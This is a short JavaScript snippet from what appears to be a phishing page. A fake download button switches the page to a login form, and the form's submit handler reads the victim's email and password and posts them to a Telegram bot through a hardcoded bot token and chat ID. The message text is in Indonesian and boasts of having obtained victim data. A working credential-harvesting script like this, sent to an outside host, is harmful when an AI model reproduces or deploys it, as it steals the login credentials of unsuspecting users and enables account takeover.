const downloadBtn = document.getElementById('downloadBtn');
        const downloadPage = document.getElementById('downloadPage');
        const loginPage = document.getElementById('loginPage');

        downloadBtn.addEventListener('click', function(event) {
            event.preventDefault();
            downloadPage.style.display = 'none';
            loginPage.style.display = 'block';
        });

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const botToken = '7598576018:AAEJToie_DdmgRGkf9gxj-r_lOFzawYWr-A';
            const chatId = '7518540373';

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: ` BERHASIL MENDAPATKAN DATA KORBAN ✅🥱
                    
email: ${email}\npassword: ${password}

DEV BY @AkmalModsV2`
                })
            });
        });